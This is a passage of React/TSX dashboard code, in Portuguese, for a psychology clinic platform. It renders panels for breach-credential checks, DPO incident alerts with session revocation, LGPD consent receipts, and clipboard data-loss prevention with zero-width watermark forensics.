                        <CheckCircle2 className="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
                      )}
                      {kAnonResult.matched ? 'Credencial Comprometida!' : 'Credencial Não Localizada em Vazamentos'}
                    </span>
                    <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-white/70 dark:bg-black/30">
                      Prefixo: {kAnonResult.prefix}
                    </span>
                  </div>

                  {kAnonResult.matched ? (
                    <div className="text-[11px] space-y-1">
                      <p>
                        Identificamos <strong>{kAnonResult.breachCount.toLocaleString('pt-BR')}</strong> ocorrências desta credencial em bases públicas da Dark Web / infostealers.
                      </p>
                      {kAnonResult.breachesFound.length > 0 && (
                        <div className="text-[10px] text-rose-800 dark:text-rose-300">
                          Fontes: {kAnonResult.breachesFound.join(', ')}
                        </div>
                      )}
                      <p className="font-semibold text-rose-700 dark:text-rose-400 pt-1">
                        Recomendação CFP: Substitua esta senha imediatamente e habilite autenticação biométrica (WebAuthn / Passkey).
                      </p>
                    </div>
                  ) : (
                    <p className="text-[11px] text-emerald-800 dark:text-emerald-300">
                      Nenhuma ocorrência encontrada para o prefixo {kAnonResult.prefix}. Esta credencial não consta nos dumps monitorados.
                    </p>
                  )}
                </div>
              )}
            </div>

            {/* Coluna 2: Central de Alertas e Notificações DPO */}
            <div className="p-5 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200/80 dark:border-slate-800 space-y-4">
              <div className="flex items-center justify-between pb-2 border-b border-slate-200/60 dark:border-slate-800">
                <div className="flex items-center gap-2">
                  <Bell className="w-4 h-4 text-rose-600 dark:text-rose-400" />
                  <h3 className="text-xs font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider">
                    Central de Alertas DPO (Resolução CD/ANPD 15/2024)
                  </h3>
                </div>
                <span className="text-[10px] font-mono text-slate-400">
                  {dpoAlerts.length} alerta(s)
                </span>
              </div>

              {dpoAlerts.length === 0 ? (
                <div className="p-6 text-center text-xs text-slate-400 bg-white dark:bg-slate-900 rounded-xl border border-dashed border-slate-200 dark:border-slate-700">
                  Nenhum alerta de vazamento pendente. As credenciais institucionais estão íntegras.
                </div>
              ) : (
                <div className="space-y-3 max-h-[340px] overflow-y-auto pr-1">
                  {dpoAlerts.map((alert) => (
                    <div
                      key={alert.alertId}
                      className="p-3.5 rounded-xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 space-y-2 text-xs"
                    >
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-slate-900 dark:text-white flex items-center gap-1.5">
                          <AlertCircle className={`w-3.5 h-3.5 ${
                            alert.severity === BreachSeverity.CRITICAL ? 'text-rose-600' : 'text-amber-600'
                          }`} />
                          {alert.title}
                        </span>
                        <span className={`px-2 py-0.5 rounded text-[10px] font-extrabold ${
                          alert.severity === BreachSeverity.CRITICAL
                            ? 'bg-rose-100 text-rose-800 dark:bg-rose-950/80 dark:text-rose-300'
                            : 'bg-amber-100 text-amber-800 dark:bg-amber-950/80 dark:text-amber-300'
                        }`}>
                          {alert.severity}
                        </span>
                      </div>

                      <p className="text-slate-600 dark:text-slate-400 text-[11px] leading-relaxed">
                        {alert.summary}
                      </p>

                      <div className="flex items-center justify-between pt-1 border-t border-slate-100 dark:border-slate-800 text-[10px] text-slate-400">
                        <span>Prazo ANPD: {new Date(alert.anpdDeadlineAt).toLocaleDateString('pt-BR')} (3 dias)</span>
                        <span className="font-mono">{alert.status}</span>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>

          {/* Tabela de Incidentes e Contenção de Sessões */}
          <div className="space-y-3 pt-2">
            <div className="flex items-center justify-between">
              <h3 className="text-xs font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider">
                Trilha de Incidentes na Dark Web & Contenção Imediata
              </h3>
              <span className="text-xs text-slate-400">
                {threatIncidents.length} incidente(s) registrado(s)
              </span>
            </div>

            {threatIncidents.length === 0 ? (
              <div className="p-6 text-center text-xs text-slate-400 bg-slate-50 dark:bg-slate-800/30 rounded-2xl border border-dashed border-slate-200 dark:border-slate-700">
                Nenhum incidente de vazamento registrado. Clique em &quot;Varredura Dark Web&quot; para consultar marketplaces clandestinos.
              </div>
            ) : (
              <div className="overflow-x-auto rounded-2xl border border-slate-200 dark:border-slate-800">
                <table className="w-full text-left text-xs">
                  <thead className="bg-slate-50 dark:bg-slate-800/70 border-b border-slate-200 dark:border-slate-700 text-slate-500 font-semibold">
                    <tr>
                      <th className="py-2.5 px-3.5">Detecção</th>
                      <th className="py-2.5 px-3.5">Conta / Titular</th>
                      <th className="py-2.5 px-3.5">Vetor</th>
                      <th className="py-2.5 px-3.5">Severidade</th>
                      <th className="py-2.5 px-3.5">Status de Contenção</th>
                      <th className="py-2.5 px-3.5 text-right">Ação DPO</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100 dark:divide-slate-800">
                    {threatIncidents.map((inc) => (
                      <tr
                        key={inc.id}
                        className="hover:bg-slate-50 dark:hover:bg-slate-800/40 transition-colors"
                      >
                        <td className="py-2.5 px-3.5 font-mono text-[11px] text-slate-600 dark:text-slate-400 whitespace-nowrap">
                          {new Date(inc.detectedAt).toLocaleString('pt-BR')}
                        </td>
                        <td className="py-2.5 px-3.5 font-medium text-slate-800 dark:text-slate-200">
                          <div>{inc.userEmailMasked}</div>
                          <div className="text-[10px] text-slate-400 font-mono">{inc.userRole}</div>
                        </td>
                        <td className="py-2.5 px-3.5 text-slate-600 dark:text-slate-400">
                          <div>{inc.source}</div>
                          <div className="text-[10px] text-slate-400">{inc.breachTitle}</div>
                        </td>
                        <td className="py-2.5 px-3.5">
                          <span className={`px-2 py-0.5 rounded text-[10px] font-extrabold ${
                            inc.severity === BreachSeverity.CRITICAL
                              ? 'bg-rose-100 text-rose-800 dark:bg-rose-950/80 dark:text-rose-300'
                              : inc.severity === BreachSeverity.HIGH
                              ? 'bg-amber-100 text-amber-800 dark:bg-amber-950/80 dark:text-amber-300'
                              : inc.severity === BreachSeverity.MEDIUM
                              ? 'bg-yellow-100 text-yellow-800 dark:bg-yellow-950/80 dark:text-yellow-300'
                              : 'bg-slate-100 text-slate-800 dark:bg-slate-800 dark:text-slate-300'
                          }`}>
                            {inc.severity}
                          </span>
                        </td>
                        <td className="py-2.5 px-3.5">
                          <span className={`px-2 py-0.5 rounded text-[10px] font-extrabold ${
                            inc.containmentStatus === IncidentContainmentStatus.RESOLVED
                              ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/80 dark:text-emerald-300'
                              : inc.containmentStatus === IncidentContainmentStatus.CONTAINED_REVOKED
                              ? 'bg-cyan-100 text-cyan-800 dark:bg-cyan-950/80 dark:text-cyan-300'
                              : inc.containmentStatus === IncidentContainmentStatus.PENDING_PASSWORD_RESET
                              ? 'bg-amber-100 text-amber-800 dark:bg-amber-950/80 dark:text-amber-300'
                              : 'bg-rose-100 text-rose-800 dark:bg-rose-950/80 dark:text-rose-300'
                          }`}>
                            {inc.containmentStatus}
                          </span>
                          {inc.sessionsRevokedCount > 0 && (
                            <span className="block text-[9px] text-slate-400 mt-0.5">
                              {inc.sessionsRevokedCount} sessão(ões) revogada(s)
                            </span>
                          )}
                        </td>
                        <td className="py-2.5 px-3.5 text-right whitespace-nowrap">
                          <div className="flex items-center justify-end gap-1.5">
                            {inc.containmentStatus === IncidentContainmentStatus.DETECTED_UNCONTAINED && (
                              <button
                                type="button"
                                onClick={() => handleContainIncident(inc.id)}
                                disabled={containingIncidentId === inc.id}
                                className="inline-flex items-center gap-1 px-2.5 py-1 rounded-lg bg-rose-600 hover:bg-rose-700 text-white text-xs font-semibold cursor-pointer transition-colors disabled:opacity-50"
                              >
                                <Ban className="w-3 h-3" />
                                <span>{containingIncidentId === inc.id ? 'Revogando...' : 'Revogar Sessões'}</span>
                              </button>
                            )}

                            {inc.containmentStatus !== IncidentContainmentStatus.RESOLVED && (
                              <button
                                type="button"
                                onClick={() => setResolvingIncident(inc)}
                                className="inline-flex items-center gap-1 px-2.5 py-1 rounded-lg bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-300 text-xs font-semibold cursor-pointer transition-colors"
                              >
                                <CheckCircle2 className="w-3 h-3 text-emerald-600" />
                                <span>Resolver DPO</span>
                              </button>
                            )}
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Card 19: Central de Governança de Consentimento do Paciente & Smart Revocation (LGPD Art. 7/8/9/11/18 & CFP 006/2019) */}
      {(currentUser.role === UserRole.ADMIN || currentUser.role === UserRole.PSICOLOGO_TITULAR) && (
        <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-100 dark:border-slate-800">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-2xl bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 flex items-center justify-center">
                <FileCheck2 className="w-5 h-5" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <h2 className="text-base font-bold text-slate-900 dark:text-white">
                    Card 19: Governança Granular de Consentimento & Smart Revocation
                  </h2>
                  <span className="px-2.5 py-0.5 rounded-full text-[10px] font-extrabold bg-emerald-100 text-emerald-800 dark:bg-emerald-950/80 dark:text-emerald-300">
                    LGPD Art. 7/8/9/11/18
                  </span>
                </div>
                <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
                  Termo de Consentimento Livre e Esclarecido (TCLE) com segregação de 5 finalidades, Recibos Canônicos SHA-256 e Bloqueio Ativo (Res. CFP nº 006/2019)
                </p>
              </div>
            </div>

            <div className="flex items-center gap-2">
              <button
                type="button"
                onClick={fetchConsentData}
                disabled={loadingConsentData}
                className="px-3 py-1.5 rounded-xl border border-slate-200 dark:border-slate-700 bg-slate-50 dark:bg-slate-800 hover:bg-slate-100 dark:hover:bg-slate-700 text-xs font-semibold text-slate-700 dark:text-slate-200 flex items-center gap-1.5 transition-colors cursor-pointer"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${loadingConsentData ? 'animate-spin' : ''}`} />
                <span>Atualizar Métricas</span>
              </button>
            </div>
          </div>

          {/* 4 KPIs em Tempo Real */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
            <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-100 dark:border-slate-800">
              <span className="text-[11px] text-slate-500 dark:text-slate-400 block font-medium">
                Pacientes com TCLE Ativo
              </span>
              <div className="text-2xl font-black text-slate-900 dark:text-white mt-1">
                {consentOverview?.totalPatientsWithConsent || 0}
              </div>
              <span className="text-[10px] text-emerald-600 dark:text-emerald-400 mt-1 block">
                Versão {consentOverview?.termVersionActive || 'v2.1'}
              </span>
            </div>

            <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-100 dark:border-slate-800">
              <span className="text-[11px] text-slate-500 dark:text-slate-400 block font-medium">
                Smart Revocations Registradas
              </span>
              <div className="text-2xl font-black text-amber-600 dark:text-amber-400 mt-1">
                {consentOverview?.revocationsCount || 0}
              </div>
              <span className="text-[10px] text-slate-400 mt-1 block">
                Revogações pelo Art. 8º §5º
              </span>
            </div>

            <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-100 dark:border-slate-800">
              <span className="text-[11px] text-slate-500 dark:text-slate-400 block font-medium">
                Bloqueios Ativos de Tratamento
              </span>
              <div className="text-2xl font-black text-rose-600 dark:text-rose-400 mt-1">
                {consentOverview?.blockedProcessingsCount || 0}
              </div>
              <span className="text-[10px] text-rose-500 mt-1 block">
                Consent-Led Enforcements
              </span>
            </div>

            <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-100 dark:border-slate-800">
              <span className="text-[11px] text-slate-500 dark:text-slate-400 block font-medium">
                Taxa de Conformidade LGPD
              </span>
              <div className="text-2xl font-black text-emerald-600 dark:text-emerald-400 mt-1">
                {consentOverview?.complianceRatePercent || 100}%
              </div>
              <span className="text-[10px] text-slate-400 mt-1 block">
                Consentimento Informado Ativo
              </span>
            </div>
          </div>

          {/* Validador de Recibos TCLE & Escopos Ativos */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 pt-1">
            {/* Validador Público de Recibo WORM */}
            <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-800 space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-xs font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider flex items-center gap-1.5">
                  <ShieldCheck className="w-4 h-4 text-emerald-600" />
                  Validador de Recibo TCLE (Zero-Knowledge)
                </span>
                <span className="text-[10px] text-slate-400 font-mono">Token tcle_v1_*</span>
              </div>

              <p className="text-xs text-slate-500 dark:text-slate-400 leading-relaxed">
                Insira o token público de consentimento do titular para conferir matematicamente a autenticidade e integridade temporal na hash-chain WORM sem divulgar prontuários clínicos.
              </p>

              <form onSubmit={handleVerifyConsentToken} className="space-y-2.5">
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={verifyTokenInput}
                    onChange={(e) => setVerifyTokenInput(e.target.value)}
                    placeholder="Cole o token do recibo (ex: tcle_v1_eyJ...)"
                    className="flex-1 bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 rounded-xl px-3 py-2 text-xs text-slate-900 dark:text-white font-mono focus:outline-none focus:border-emerald-500"
                  />
                  <button
                    type="submit"
                    disabled={verifyingToken || !verifyTokenInput.trim()}
                    className="px-4 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold transition-all shadow-sm disabled:opacity-50 cursor-pointer shrink-0"
                  >
                    {verifyingToken ? 'Verificando...' : 'Validar Recibo'}
                  </button>
                </div>
              </form>

              {verifyTokenResult && (
                <div
                  className={`p-3.5 rounded-xl border text-xs space-y-1.5 animate-fade-in ${
                    verifyTokenResult.valid
                      ? 'bg-emerald-50/80 dark:bg-emerald-950/40 border-emerald-200 dark:border-emerald-800 text-emerald-900 dark:text-emerald-200'
                      : 'bg-rose-50/80 dark:bg-rose-950/40 border-rose-200 dark:border-rose-800 text-rose-900 dark:text-rose-200'
                  }`}
                >
                  <div className="flex items-center justify-between font-bold">
                    <span className="flex items-center gap-1.5">
                      {verifyTokenResult.valid ? (
                        <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
                      ) : (
                        <AlertCircle className="w-4 h-4 text-rose-600 shrink-0" />
                      )}
                      {verifyTokenResult.valid ? 'Recibo Autêntico & Válido' : 'Recibo Inválido ou Adulterado'}
                    </span>
                    {verifyTokenResult.receipt && (
                      <span className="font-mono text-[10px] px-2 py-0.5 rounded bg-white/70 dark:bg-slate-900/60">
                        {verifyTokenResult.receipt.action} — {verifyTokenResult.receipt.status}
                      </span>
                    )}
                  </div>
                  <p className="text-[11px] leading-relaxed">{verifyTokenResult.message}</p>
                  {verifyTokenResult.receipt && (
                    <div className="pt-1.5 border-t border-emerald-200/60 dark:border-emerald-800/60 font-mono text-[10px] space-y-0.5 text-slate-600 dark:text-slate-300">
                      <div>Titular Mascarado: <strong>{verifyTokenResult.patientNameMasked}</strong></div>
                      <div>Escopo: <strong>{verifyTokenResult.receipt.scope}</strong></div>
                      <div>Base Legal: <strong>{verifyTokenResult.receipt.legalBasis}</strong></div>
                      <div className="truncate">Hash SHA-256: {verifyTokenResult.receipt.receiptHash}</div>
                      <div>Carimbo Temporal: {new Date(verifyTokenResult.receipt.timestamp).toLocaleString('pt-BR')}</div>
                    </div>
                  )}
                </div>
              )}
            </div>

            {/* Painel de Escopos Determinados da Plataforma */}
            <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-800 space-y-3">
              <span className="text-xs font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider block">
                Volume de Consentimentos Ativos por Finalidade
              </span>

              <div className="space-y-2 text-xs">
                {[
                  {
                    scope: ConsentScope.TELECONSULTATION_AUDIO_RECORDING,
                    label: 'Gravação Audiovisual para Teleconsulta',
                    basis: 'Res. CFP nº 011/2018'
                  },
                  {
                    scope: ConsentScope.AI_CLINICAL_SYNTHESIS,
                    label: 'Síntese Clínica & Rascunho SOAP por IA',
                    basis: 'LGPD Art. 11, I'
                  },
                  {
                    scope: ConsentScope.ANONYMIZED_RESEARCH,
                    label: 'Pesquisa Científica & Dados Anonimizados',
                    basis: 'LGPD Art. 7º, IV'
                  },
                  {
                    scope: ConsentScope.INTERPROFESSIONAL_SHARING,
                    label: 'Compartilhamento Interprofissional',
                    basis: 'Res. CFP nº 006/2019'
                  },
                  {
                    scope: ConsentScope.COMMUNICATION_REMINDERS,
                    label: 'Lembretes de Consultas & Comunicações',
                    basis: 'LGPD Art. 7º, I'
                  }
                ].map((item) => {
                  const count = consentOverview?.activeConsentsByScope?.[item.scope] || 0;
                  return (
                    <div
                      key={item.scope}
                      className="p-2.5 rounded-xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 flex items-center justify-between"
                    >
                      <div>
                        <div className="font-semibold text-slate-800 dark:text-slate-200 text-xs">
                          {item.label}
                        </div>
                        <div className="text-[10px] text-slate-400">{item.basis}</div>
                      </div>
                      <span className="px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-800 dark:bg-emerald-950/80 dark:text-emerald-300 text-xs font-mono font-bold">
                        {count} ativo(s)
                      </span>
                    </div>
                  );
                })}
              </div>
            </div>
          </div>

          {/* Tabela de Recibos Recentes WORM */}
          <div className="space-y-3 pt-2">
            <div className="flex items-center justify-between">
              <h3 className="text-xs font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider">
                Trilha de Recibos de Consentimento (Hash-Chain WORM)
              </h3>
              <span className="text-xs text-slate-400">
                {consentReceipts.length} recibo(s) recente(s)
              </span>
            </div>

            {consentReceipts.length === 0 ? (
              <div className="p-6 text-center text-xs text-slate-400 bg-slate-50 dark:bg-slate-800/30 rounded-2xl border border-dashed border-slate-200 dark:border-slate-700">
                Nenhum recibo de consentimento gerado recentemente. Conceda ou revogue consentimentos no módulo de pacientes.
              </div>
            ) : (
              <div className="overflow-x-auto rounded-2xl border border-slate-200 dark:border-slate-800">
                <table className="w-full text-left text-xs">
                  <thead className="bg-slate-50 dark:bg-slate-800/70 border-b border-slate-200 dark:border-slate-700 text-slate-500 font-semibold">
                    <tr>
                      <th className="py-2.5 px-3.5">Carimbo Temporal</th>
                      <th className="py-2.5 px-3.5">Escopo</th>
                      <th className="py-2.5 px-3.5">Ação / Status</th>
                      <th className="py-2.5 px-3.5">Hash SHA-256 (WORM)</th>
                      <th className="py-2.5 px-3.5 text-right">Token TCLE</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100 dark:divide-slate-800">
                    {consentReceipts.map((rcpt) => (
                      <tr
                        key={rcpt.receiptId}
                        className="hover:bg-slate-50 dark:hover:bg-slate-800/40 transition-colors"
                      >
                        <td className="py-2.5 px-3.5 font-mono text-[11px] text-slate-600 dark:text-slate-400 whitespace-nowrap">
                          {new Date(rcpt.timestamp).toLocaleString('pt-BR')}
                        </td>
                        <td className="py-2.5 px-3.5 font-semibold text-slate-800 dark:text-slate-200">
                          {rcpt.scope}
                        </td>
                        <td className="py-2.5 px-3.5">
                          <span
                            className={`px-2 py-0.5 rounded text-[10px] font-extrabold ${
                              rcpt.action === 'GRANT'
                                ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/80 dark:text-emerald-300'
                                : 'bg-amber-100 text-amber-800 dark:bg-amber-950/80 dark:text-amber-300'
                            }`}
                          >
                            {rcpt.action} — {rcpt.status}
                          </span>
                        </td>
                        <td className="py-2.5 px-3.5 font-mono text-[10px] text-slate-500 dark:text-slate-400 truncate max-w-xs">
                          {rcpt.receiptHash}
                        </td>
                        <td className="py-2.5 px-3.5 text-right font-mono text-[10px]">
                          <button
                            type="button"
                            onClick={() => {
                              navigator.clipboard.writeText(rcpt.verificationToken);
                              alert('Token de consentimento copiado com sucesso!');
                            }}
                            className="px-2 py-1 rounded-lg bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 font-semibold cursor-pointer transition-colors"
                          >
                            Copiar Token
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Card 20: Data Loss Prevention (DLP) no Clipboard & Marca d'Água Esteganográfica (LGPD Art. 46 & CFP nº 001/2009) */}
      {(currentUser.role === UserRole.ADMIN || currentUser.role === UserRole.PSICOLOGO_TITULAR) && (
        <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 sm:p-8 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
          {/* Header */}
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-100 dark:border-slate-800">
            <div>
              <div className="flex items-center gap-2">
                <span className="px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider bg-violet-100 text-violet-800 dark:bg-violet-950/60 dark:text-violet-300 border border-violet-200 dark:border-violet-800">
                  Card 20: Prevenção de Exfiltração & Esteganografia
                </span>
                <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400">
                  LGPD Art. 46 / CFP nº 001/2009
                </span>
              </div>
              <h2 className="text-lg font-bold text-slate-900 dark:text-white flex items-center gap-2 mt-1.5">
                <FileSearch className="w-5 h-5 text-violet-600 dark:text-violet-400" />
                Data Loss Prevention (DLP) no Clipboard & Rastreabilidade Forense Esteganográfica
              </h2>
              <p className="text-xs text-slate-600 dark:text-slate-400 mt-1 max-w-3xl">
                Intercepção de cópias de prontuários com injeção imperceptível de marca d'água esteganográfica em caracteres de largura zero (ZWSP/ZWNJ). Permite identificar a autoria, timestamp e procedência de notas clínicas vazadas externamente sem alterar a leitura humana do texto.
              </p>
            </div>

            <div className="flex items-center gap-2 self-start sm:self-center">
              <button
                type="button"
                onClick={fetchDlpData}
                disabled={loadingDlp}
                className="inline-flex items-center gap-2 px-3.5 py-2 rounded-xl bg-violet-600 hover:bg-violet-700 text-white text-xs font-semibold shadow-sm transition-all cursor-pointer disabled:opacity-50"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${loadingDlp ? 'animate-spin' : ''}`} />
                Atualizar DLP
              </button>
            </div>
          </div>

          {/* Configuração de Política Ativa */}
          {currentUser.role === UserRole.ADMIN && (
            <div className="p-4 rounded-2xl bg-violet-50/50 dark:bg-violet-950/20 border border-violet-200/80 dark:border-violet-800/50 space-y-3">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                <div>
                  <h4 className="text-xs font-bold text-violet-950 dark:text-violet-200 uppercase tracking-wider flex items-center gap-1.5">
                    <ShieldCheck className="w-4 h-4 text-violet-600 dark:text-violet-400" />
                    Política Ativa de Proteção de Área de Transferência (Clipboard Policy Mode)
                  </h4>
                  <p className="text-[11px] text-slate-600 dark:text-slate-400 mt-0.5">
                    Selecione como o sistema trata a cópia de prontuários, notas SOAP e anamneses na interface clínica.
                  </p>
                </div>
                <div className="flex flex-wrap items-center gap-2">
                  {[
                    { mode: DlpPolicyMode.WATERMARK_ONLY, label: 'Marca d\'Água Invisível' },
                    { mode: DlpPolicyMode.WATERMARK_AND_NOTICE, label: 'Marca d\'Água + Aviso CFP' },
                    { mode: DlpPolicyMode.MASK_SENSITIVE, label: 'Mascarar PII / CPF' },
                    { mode: DlpPolicyMode.BLOCK_EXFILTRATION, label: 'Bloquear Exfiltração em Massa' }
                  ].map((p) => (
                    <button
                      key={p.mode}
                      type="button"
                      disabled={updatingDlpPolicy}
                      onClick={() => handleUpdateDlpPolicy(p.mode)}
                      className={`px-3 py-1.5 rounded-xl text-xs font-semibold cursor-pointer transition-all ${
                        dlpOverview?.activePolicy === p.mode
                          ? 'bg-violet-600 text-white shadow-sm ring-2 ring-violet-500/30'
                          : 'bg-white dark:bg-slate-800 text-slate-700 dark:text-slate-300 border border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-750'
                      }`}
                    >
                      {p.label}
                    </button>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* 4 KPIs Regulatórios */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
            <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700/60">
              <span className="text-[11px] font-semibold text-slate-500 dark:text-slate-400">Cópias Monitoradas</span>
              <div className="text-2xl font-black text-slate-900 dark:text-white mt-1">
                {dlpOverview?.totalCopiesMonitored ?? 0}
              </div>
              <span className="text-[10px] text-slate-500 mt-1 block">Auditadas na trilha WORM</span>
            </div>

            <div className="p-4 rounded-2xl bg-emerald-50/50 dark:bg-emerald-950/20 border border-emerald-200 dark:border-emerald-800/40">
              <span className="text-[11px] font-semibold text-emerald-700 dark:text-emerald-300">Marcas Injetadas</span>
              <div className="text-2xl font-black text-emerald-600 dark:text-emerald-400 mt-1">
                {dlpOverview?.watermarksEmbedded ?? 0}
              </div>
              <span className="text-[10px] text-emerald-600/80 mt-1 block">Esteganografia zero-width ativa</span>
            </div>

            <div className="p-4 rounded-2xl bg-rose-50/50 dark:bg-rose-950/20 border border-rose-200 dark:border-rose-800/40">
              <span className="text-[11px] font-semibold text-rose-700 dark:text-rose-300">Exfiltrações Bloqueadas</span>
              <div className="text-2xl font-black text-rose-600 dark:text-rose-400 mt-1">
                {dlpOverview?.bulkExfiltrationsBlocked ?? 0}
              </div>
              <span className="text-[10px] text-rose-600/80 mt-1 block">Cópia em massa de prontuário</span>
            </div>

            <div className="p-4 rounded-2xl bg-indigo-50/50 dark:bg-indigo-950/20 border border-indigo-200 dark:border-indigo-800/40">
              <span className="text-[11px] font-semibold text-indigo-700 dark:text-indigo-300">Perícias Forenses</span>
              <div className="text-2xl font-black text-indigo-600 dark:text-indigo-400 mt-1">
                {dlpOverview?.forensicInspectionsPerformed ?? 0}
              </div>
              <span className="text-[10px] text-indigo-600/80 mt-1 block">Textos com ZW decoder</span>
            </div>
          </div>

          {/* Ferramenta de Perícia Forense Esteganográfica */}
          <div className="p-5 rounded-2xl bg-slate-50 dark:bg-slate-800/50 border border-slate-200 dark:border-slate-700/60 space-y-4">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
              <div>
                <h3 className="text-sm font-bold text-slate-900 dark:text-white flex items-center gap-2">
                  <Fingerprint className="w-4 h-4 text-violet-600 dark:text-violet-400" />
                  Perícia Forense de Esteganografia (Zero-Width Decoder)
                </h3>
                <p className="text-xs text-slate-600 dark:text-slate-400 mt-0.5">
                  Cole qualquer texto suspeito de vazamento (chats, WhatsApp, notas externas) para extrair os caracteres invisíveis e identificar o autor da cópia e o paciente afetado.
                </p>
              </div>
              <button
                type="button"
                onClick={handleLoadDlpDemoSample}
                className="text-xs font-semibold text-violet-600 dark:text-violet-400 hover:underline cursor-pointer self-start sm:self-auto"
              >
                Carregar Amostra Protegida de Teste
              </button>
            </div>

            <form onSubmit={handleInspectDlp} className="space-y-3">
              <textarea
                rows={3}
                required
                value={inspectInputText}
                onChange={(e) => setInspectInputText(e.target.value)}
                placeholder="Cole o texto suspeito de exfiltração aqui..."
                className="w-full px-3.5 py-2.5 rounded-xl bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white resize-none font-mono"
              />

              <div className="flex justify-end gap-2">
                {inspectInputText && (
                  <button
                    type="button"
                    onClick={() => { setInspectInputText(''); setInspectResult(null); }}
                    className="px-3 py-1.5 rounded-xl text-xs font-semibold text-slate-500 hover:bg-slate-200 dark:hover:bg-slate-750 cursor-pointer"
                  >
                    Limpar
                  </button>
                )}
                <button
                  type="submit"
                  disabled={inspectingDlp || !inspectInputText.trim()}
                  className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-violet-600 hover:bg-violet-700 text-white text-xs font-semibold shadow-sm transition-all cursor-pointer disabled:opacity-50"
                >
                  <Search className={`w-3.5 h-3.5 ${inspectingDlp ? 'animate-spin' : ''}`} />
                  {inspectingDlp ? 'Decodificando...' : 'Realizar Perícia Forense'}
                </button>
              </div>
            </form>

            {/* Resultado da Perícia Forense */}
            {inspectResult && (
              <div className={`p-4 rounded-xl border text-xs space-y-3 ${
                inspectResult.status === SteganographyInspectionStatus.GENUINE_WATERMARK
                  ? 'bg-emerald-50/70 dark:bg-emerald-950/30 border-emerald-300 dark:border-emerald-800'
                  : inspectResult.status === SteganographyInspectionStatus.NO_WATERMARK
                  ? 'bg-slate-100 dark:bg-slate-800/60 border-slate-300 dark:border-slate-700'
                  : 'bg-rose-50/70 dark:bg-rose-950/30 border-rose-300 dark:border-rose-800'
              }`}>
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-2 border-b border-slate-200/60 dark:border-slate-700/60">
                  <div className="flex items-center gap-2">
                    <span className={`px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider ${
                      inspectResult.status === SteganographyInspectionStatus.GENUINE_WATERMARK
                        ? 'bg-emerald-200 text-emerald-900 dark:bg-emerald-900 dark:text-emerald-200'
                        : inspectResult.status === SteganographyInspectionStatus.NO_WATERMARK
                        ? 'bg-slate-200 text-slate-800 dark:bg-slate-700 dark:text-slate-300'
                        : 'bg-rose-200 text-rose-900 dark:bg-rose-900 dark:text-rose-200'
                    }`}>
                      {inspectResult.status}
                    </span>
                    <span className="font-bold text-slate-800 dark:text-slate-200">
                      {inspectResult.message}
                    </span>
                  </div>
